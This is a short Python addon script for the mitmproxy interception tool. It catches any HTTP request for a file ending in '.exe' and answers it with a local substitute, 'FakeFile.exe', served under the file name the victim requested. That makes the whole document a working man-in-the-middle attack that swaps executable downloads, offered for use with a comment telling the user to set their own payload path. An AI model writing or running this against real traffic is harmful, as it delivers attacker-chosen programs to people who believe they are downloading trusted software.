from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_url.endswith(".exe"):
        print("Captured.")
        
        file_name = flow.request.pretty_url.split("/")[-1]
        
        local_file_path = "/home/superuser/Downloads/FakeFile.exe" # Change this path with your file location.
        
        
        try:
            with open(local_file_path, "rb") as f:
                content = f.read()
            
            flow.response = http.Response.make(
                200,
                content,
                {
                    "Content-Disposition": f"attachment; filename={file_name}",
                    "Content-Type": "application/octet-stream"
                }
            )
        except Exception as e:
            print(f"File reading exception: {e}")
            flow.response = http.Response.make(
                500,
                b"Internal Server Error",
                {"Content-Type": "text/plain"}
            )
